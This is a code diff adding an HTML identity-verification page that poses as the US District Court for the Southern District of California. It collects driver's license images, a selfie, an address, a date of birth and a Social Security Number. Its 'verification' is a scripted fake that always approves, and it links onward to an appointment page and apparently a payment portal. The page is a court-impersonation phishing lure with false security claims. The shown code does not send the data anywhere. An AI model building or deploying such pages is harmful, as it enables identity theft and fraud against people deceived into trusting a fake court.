@@ -1,0 +1,637 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Identity Verification - USDC Southern California</title>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+
+        body {
+            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Oxygen, Ubuntu, Cantarell, sans-serif;
+            background: linear-gradient(135deg, #001f3f 0%, #003d7a 100%);
+            min-height: 100vh;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            padding: 20px;
+        }
+
+        .verification-card {
+            background: #f5f5f5;
+            border-radius: 12px;
+            box-shadow: 0 10px 40px rgba(0, 0, 0, 0.3);
+            max-width: 600px;
+            width: 100%;
+            overflow: hidden;
+        }
+
+        .card-header {
+            background: linear-gradient(135deg, #8b1538 0%, #6b0f2a 100%);
+            color: white;
+            padding: 20px 30px;
+            position: relative;
+        }
+
+        .reset-btn {
+            position: absolute;
+            top: 15px;
+            right: 20px;
+            background: transparent;
+            border: 2px solid #ffd700;
+            color: #ffd700;
+            padding: 6px 14px;
+            border-radius: 6px;
+            cursor: pointer;
+            font-size: 13px;
+            font-weight: 600;
+            transition: all 0.3s;
+        }
+
+        .reset-btn:hover {
+            background: #ffd700;
+            color: #8b1538;
+        }
+
+        .card-header h1 {
+            font-size: 24px;
+            margin-bottom: 8px;
+            color: #8b1538;
+            background: white;
+            padding: 10px 15px;
+            border-radius: 6px;
+            display: inline-block;
+        }
+
+        .card-header p {
+            font-size: 14px;
+            opacity: 0.95;
+            margin-top: 10px;
+        }
+
+        .card-body {
+            padding: 40px 30px;
+        }
+
+        .step-indicator {
+            text-align: center;
+            margin-bottom: 30px;
+            color: #666;
+            font-size: 14px;
+            font-weight: 600;
+        }
+
+        .section-title {
+            display: flex;
+            align-items: center;
+            gap: 10px;
+            margin-bottom: 25px;
+            color: #8b1538;
+            font-size: 18px;
+            font-weight: 700;
+        }
+
+        .section-title::before {
+            content: "⚖";
+            font-size: 22px;
+        }
+
+        .form-group {
+            margin-bottom: 20px;
+        }
+
+        .form-group label {
+            display: block;
+            margin-bottom: 8px;
+            color: #333;
+            font-weight: 600;
+            font-size: 14px;
+        }
+
+        .form-group input,
+        .form-group select {
+            width: 100%;
+            padding: 12px 15px;
+            border: 2px solid #ddd;
+            border-radius: 8px;
+            font-size: 15px;
+            transition: all 0.3s;
+        }
+
+        .form-group input:focus,
+        .form-group select:focus {
+            outline: none;
+            border-color: #8b1538;
+            box-shadow: 0 0 0 3px rgba(139, 21, 56, 0.1);
+        }
+
+        .info-text {
+            background: #e8f4f8;
+            border-left: 4px solid #0066cc;
+            padding: 15px;
+            margin: 20px 0;
+            font-size: 13px;
+            color: #333;
+            line-height: 1.6;
+        }
+
+        .upload-area {
+            border: 3px dashed #ccc;
+            border-radius: 8px;
+            padding: 40px 20px;
+            text-align: center;
+            cursor: pointer;
+            transition: all 0.3s;
+            background: #fafafa;
+        }
+
+        .upload-area:hover {
+            border-color: #8b1538;
+            background: #f0f0f0;
+        }
+
+        .upload-area.uploaded {
+            border-color: #4caf50;
+            background: #f1f8f4;
+        }
+
+        .upload-icon {
+            font-size: 48px;
+            color: #999;
+            margin-bottom: 10px;
+        }
+
+        .upload-area.uploaded .upload-icon {
+            color: #4caf50;
+        }
+
+        .upload-area p {
+            color: #666;
+            margin-top: 10px;
+            font-size: 13px;
+        }
+
+        .button-group {
+            display: flex;
+            gap: 15px;
+            margin-top: 30px;
+        }
+
+        .btn {
+            flex: 1;
+            padding: 14px 24px;
+            border: none;
+            border-radius: 8px;
+            font-size: 16px;
+            font-weight: 600;
+            cursor: pointer;
+            transition: all 0.3s;
+        }
+
+        .btn-primary {
+            background: linear-gradient(135deg, #8b1538 0%, #6b0f2a 100%);
+            color: white;
+        }
+
+        .btn-primary:hover {
+            transform: translateY(-2px);
+            box-shadow: 0 6px 20px rgba(139, 21, 56, 0.4);
+        }
+
+        .btn-primary:disabled {
+            opacity: 0.5;
+            cursor: not-allowed;
+            transform: none;
+        }
+
+        .btn-secondary {
+            background: #e0e0e0;
+            color: #333;
+        }
+
+        .btn-secondary:hover {
+            background: #d0d0d0;
+        }
+
+        .processing-container {
+            text-align: center;
+            padding: 40px 20px;
+        }
+
+        .spinner {
+            width: 80px;
+            height: 80px;
+            border: 8px solid #f3f3f3;
+            border-top: 8px solid #8b1538;
+            border-radius: 50%;
+            animation: spin 1s linear infinite;
+            margin: 0 auto 30px;
+        }
+
+        @keyframes spin {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
+        }
+
+        .processing-text {
+            color: #333;
+            font-size: 18px;
+            font-weight: 600;
+            margin-bottom: 15px;
+        }
+
+        .processing-status {
+            color: #666;
+            font-size: 14px;
+            margin-bottom: 10px;
+        }
+
+        .progress-bar {
+            width: 100%;
+            height: 8px;
+            background: #e0e0e0;
+            border-radius: 4px;
+            overflow: hidden;
+            margin: 20px 0;
+        }
+
+        .progress-fill {
+            height: 100%;
+            background: linear-gradient(90deg, #8b1538 0%, #c41e3a 100%);
+            width: 0%;
+            transition: width 0.5s ease;
+        }
+
+        .success-box {
+            text-align: center;
+            padding: 40px 20px;
+        }
+
+        .success-icon {
+            font-size: 64px;
+            color: #4caf50;
+            margin-bottom: 20px;
+            animation: scaleIn 0.5s ease;
+        }
+
+        @keyframes scaleIn {
+            0% { transform: scale(0); }
+            50% { transform: scale(1.2); }
+            100% { transform: scale(1); }
+        }
+
+        .success-box h2 {
+            color: #2e7d32;
+            margin-bottom: 15px;
+            font-size: 24px;
+        }
+
+        .success-box p {
+            color: #666;
+            margin-bottom: 30px;
+            line-height: 1.6;
+        }
+
+        .hidden {
+            display: none;
+        }
+
+        @media (max-width: 640px) {
+            .card-body {
+                padding: 30px 20px;
+            }
+
+            .button-group {
+                flex-direction: column;
+            }
+
+            .btn {
+                width: 100%;
+            }
+        }
+    </style>
+</head>
+<body>
+    <div class="verification-card">
+        <div class="card-header">
+            <button class="reset-btn" onclick="resetSession()">Reset Session</button>
+            <h1>Identity Verification Procedure</h1>
+            <p id="stepText">Step 1 of 8 - Please provide accurate information</p>
+        </div>
+
+        <div class="card-body">
+            <!-- Step 1: Driver's License Front -->
+            <div id="step1" class="step">
+                <div class="step-indicator">USDC SOUTHERN DISTRICT CALIFORNIA</div>
+                
+                <div class="section-title">Upload Driver's License (Front)</div>
+
+                <div class="info-text">
+                    Take a clear photo of the <strong>front</strong> of your driver's license. Ensure all text is readable and the image is not blurry.
+                </div>
+
+                <div class="upload-area" id="uploadArea1" onclick="triggerUpload('fileInput1')">
+                    <div class="upload-icon" id="uploadIcon1">📄</div>
+                    <p id="uploadText1"><strong>Click to upload image</strong></p>
+                    <p>JPG, PNG, or HEIC format</p>
+                </div>
+                <input type="file" id="fileInput1" accept="image/*" style="display: none;" onchange="handleFileUpload(1)">
+
+                <div class="button-group">
+                    <button class="btn btn-primary" id="nextBtn1" onclick="goToStep(2)" disabled>Next →</button>
+                </div>
+            </div>
+
+            <!-- Step 2: Driver's License Back -->
+            <div id="step2" class="step hidden">
+                <div class="step-indicator">USDC SOUTHERN DISTRICT CALIFORNIA</div>
+                
+                <div class="section-title">Upload Driver's License (Back)</div>
+
+                <div class="info-text">
+                    Take a clear photo of the <strong>back</strong> of your driver's license. Make sure the barcode and any text are clearly visible.
+                </div>
+
+                <div class="upload-area" id="uploadArea2" onclick="triggerUpload('fileInput2')">
+                    <div class="upload-icon" id="uploadIcon2">📄</div>
+                    <p id="uploadText2"><strong>Click to upload image</strong></p>
+                    <p>JPG, PNG, or HEIC format</p>
+                </div>
+                <input type="file" id="fileInput2" accept="image/*" style="display: none;" onchange="handleFileUpload(2)">
+
+                <div class="button-group">
+                    <button class="btn btn-secondary" onclick="goToStep(1)">← Back</button>
+                    <button class="btn btn-primary" id="nextBtn2" onclick="goToStep(3)" disabled>Next →</button>
+                </div>
+            </div>
+
+            <!-- Step 3: Selfie -->
+            <div id="step3" class="step hidden">
+                <div class="step-indicator">USDC SOUTHERN DISTRICT CALIFORNIA</div>
+                
+                <div class="section-title">Upload Selfie Photo</div>
+
+                <div class="info-text">
+                    Take a clear selfie photo of yourself. Make sure your face is clearly visible, well-lit, and matches your ID photo.
+                </div>
+
+                <div class="upload-area" id="uploadArea3" onclick="triggerUpload('fileInput3')">
+                    <div class="upload-icon" id="uploadIcon3">🤳</div>
+                    <p id="uploadText3"><strong>Click to upload selfie</strong></p>
+                    <p>JPG, PNG, or HEIC format</p>
+                </div>
+                <input type="file" id="fileInput3" accept="image/*" style="display: none;" onchange="handleFileUpload(3)">
+
+                <div class="button-group">
+                    <button class="btn btn-secondary" onclick="goToStep(2)">← Back</button>
+                    <button class="btn btn-primary" id="nextBtn3" onclick="goToStep(4)" disabled>Next →</button>
+                </div>
+            </div>
+
+            <!-- Step 4: Address -->
+            <div id="step4" class="step hidden">
+                <div class="step-indicator">USDC SOUTHERN DISTRICT CALIFORNIA</div>
+                
+                <div class="section-title">Address Information</div>
+
+                <div class="form-group">
+                    <label for="address">Street Address</label>
+                    <input type="text" id="address" placeholder="Enter street address" required>
+                </div>
+
+                <div class="form-group">
+                    <label for="city">City</label>
+                    <input type="text" id="city" placeholder="Enter city" required>
+                </div>
+
+                <div class="form-group">
+                    <label for="state">State</label>
+                    <select id="state">
+                        <option value="CA">California</option>
+                        <option value="AZ">Arizona</option>
+                        <option value="NV">Nevada</option>
+                        <option value="OR">Oregon</option>
+                        <option value="WA">Washington</option>
+                    </select>
+                </div>
+
+                <div class="form-group">
+                    <label for="zip">ZIP Code</label>
+                    <input type="text" id="zip" placeholder="Enter ZIP code" maxlength="5" required>
+                </div>
+
+                <div class="info-text">
+                    Please provide your current residential address as it appears on your driver's license.
+                </div>
+
+                <div class="button-group">
+                    <button class="btn btn-secondary" onclick="goToStep(3)">← Back</button>
+                    <button class="btn btn-primary" onclick="goToStep(5)">Next →</button>
+                </div>
+            </div>
+
+            <!-- Step 5: Date of Birth -->
+            <div id="step5" class="step hidden">
+                <div class="step-indicator">USDC SOUTHERN DISTRICT CALIFORNIA</div>
+                
+                <div class="section-title">Date of Birth</div>
+
+                <div class="form-group">
+                    <label for="dob">Date of Birth</label>
+                    <input type="date" id="dob" required>
+                </div>
+
+                <div class="info-text">
+                    Please enter your date of birth exactly as it appears on your identification document.
+                </div>
+
+                <div class="button-group">
+                    <button class="btn btn-secondary" onclick="goToStep(4)">← Back</button>
+                    <button class="btn btn-primary" onclick="goToStep(6)">Next →</button>
+                </div>
+            </div>
+
+            <!-- Step 6: Social Security Number -->
+            <div id="step6" class="step hidden">
+                <div class="step-indicator">USDC SOUTHERN DISTRICT CALIFORNIA</div>
+                
+                <div class="section-title">Social Security Number</div>
+
+                <div class="form-group">
+                    <label for="ssn">Social Security Number</label>
+                    <input type="text" id="ssn" placeholder="XXX-XX-XXXX" maxlength="11" required>
+                </div>
+
+                <div class="info-text">
+                    <strong>🔒 Your information is secure.</strong> Your Social Security Number is required for identity verification and will be encrypted and protected according to federal privacy standards.
+                </div>
+
+                <div class="button-group">
+                    <button class="btn btn-secondary" onclick="goToStep(5)">← Back</button>
+                    <button class="btn btn-primary" onclick="startProcessing()">Submit for Verification →</button>
+                </div>
+            </div>
+
+            <!-- Step 7: Processing -->
+            <div id="step7" class="step hidden">
+                <div class="processing-container">
+                    <div class="spinner"></div>
+                    <div class="processing-text">Verifying Your Identity</div>
+                    <div class="processing-status" id="processingStatus">Initializing verification...</div>
+                    <div class="progress-bar">
+                        <div class="progress-fill" id="progressFill"></div>
+                    </div>
+                </div>
+            </div>
+
+            <!-- Step 8: Approved -->
+            <div id="step8" class="step hidden">
+                <div class="success-box">
+                    <div class="success-icon">✓</div>
+                    <h2>Identity Verification Approved</h2>
+                    <p><strong>Verification Complete!</strong><br><br>Your identity has been successfully verified with the USDC Southern District of California.<br><br>You may now proceed to schedule your signature analysis appointment.</p>
+                    
+                    <button class="btn btn-primary" onclick="completeVerification()">Schedule Appointment Now →</button>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <script>
+        let currentStep = 1;
+        const totalSteps = 8;
+
+        // Format SSN input
+        document.getElementById('ssn').addEventListener('input', function(e) {
+            let value = e.target.value.replace(/\D/g, '');
+            if (value.length > 3 && value.length <= 5) {
+                value = value.slice(0, 3) + '-' + value.slice(3);
+            } else if (value.length > 5) {
+                value = value.slice(0, 3) + '-' + value.slice(3, 5) + '-' + value.slice(5, 9);
+            }
+            e.target.value = value;
+        });
+
+        function goToStep(stepNumber) {
+            // Hide current step
+            document.getElementById('step' + currentStep).classList.add('hidden');
+            
+            // Show new step
+            currentStep = stepNumber;
+            document.getElementById('step' + currentStep).classList.remove('hidden');
+            
+            // Update step text
+            document.getElementById('stepText').textContent = `Step ${currentStep} of ${totalSteps} - Please provide accurate information`;
+            
+            // Scroll to top
+            window.scrollTo(0, 0);
+        }
+
+        function resetSession() {
+            if (confirm('Are you sure you want to reset the verification session?')) {
+                goToStep(1);
+                // Clear all form fields
+                document.querySelectorAll('input, select').forEach(field => {
+                    if (field.type !== 'file') field.value = '';
+                });
+                // Reset upload areas
+                for (let i = 1; i <= 3; i++) {
+                    document.getElementById('nextBtn' + i).disabled = true;
+                    resetUploadArea(i);
+                }
+            }
+        }
+
+        function triggerUpload(inputId) {
+            document.getElementById(inputId).click();
+        }
+
+        function handleFileUpload(stepNum) {
+            const fileInput = document.getElementById('fileInput' + stepNum);
+            if (fileInput.files.length > 0) {
+                const uploadArea = document.getElementById('uploadArea' + stepNum);
+                const uploadIcon = document.getElementById('uploadIcon' + stepNum);
+                const uploadText = document.getElementById('uploadText' + stepNum);
+                
+                uploadArea.classList.add('uploaded');
+                uploadIcon.textContent = '✓';
+                uploadText.innerHTML = `<strong>File uploaded: ${fileInput.files[0].name}</strong>`;
+                
+                document.getElementById('nextBtn' + stepNum).disabled = false;
+            }
+        }
+
+        function resetUploadArea(stepNum) {
+            const uploadArea = document.getElementById('uploadArea' + stepNum);
+            const uploadIcon = document.getElementById('uploadIcon' + stepNum);
+            const uploadText = document.getElementById('uploadText' + stepNum);
+            
+            uploadArea.classList.remove('uploaded');
+            
+            if (stepNum === 3) {
+                uploadIcon.textContent = '🤳';
+                uploadText.innerHTML = '<strong>Click to upload selfie</strong>';
+            } else {
+                uploadIcon.textContent = '📄';
+                uploadText.innerHTML = '<strong>Click to upload image</strong>';
+            }
+        }
+
+        function startProcessing() {
+            goToStep(7);
+            
+            const statuses = [
+                'Initializing verification...',
+                'Verifying driver\'s license authenticity...',
+                'Matching photo with ID document...',
+                'Validating address information...',
+                'Cross-referencing date of birth...',
+                'Verifying Social Security Number...',
+                'Running final security checks...',
+                'Verification complete!'
+            ];
+            
+            let progress = 0;
+            let statusIndex = 0;
+            
+            const interval = setInterval(() => {
+                progress += 12.5;
+                document.getElementById('progressFill').style.width = progress + '%';
+                
+                if (statusIndex < statuses.length) {
+                    document.getElementById('processingStatus').textContent = statuses[statusIndex];
+                    statusIndex++;
+                }
+                
+                if (progress >= 100) {
+                    clearInterval(interval);
+                    setTimeout(() => {
+                        goToStep(8);
+                    }, 500);
+                }
+            }, 800);
+        }
+
+        function completeVerification() {
+            // Set verification flag in localStorage
+            localStorage.setItem('identityVerified', 'true');
+            localStorage.setItem('verificationDate', new Date().toISOString());
+            
+            // Redirect to appointment scheduling page
+            window.location.href = '/schedule-appointment.html';
+        }
+
+        // Check if coming from payment portal
+        window.addEventListener('DOMContentLoaded', function() {
+            const urlParams = new URLSearchParams(window.location.search);
+            if (urlParams.get('from') === 'payment') {
+                console.log('Starting verification from payment portal');
+            }
+        });
+    </script>
+</body>
+</html>
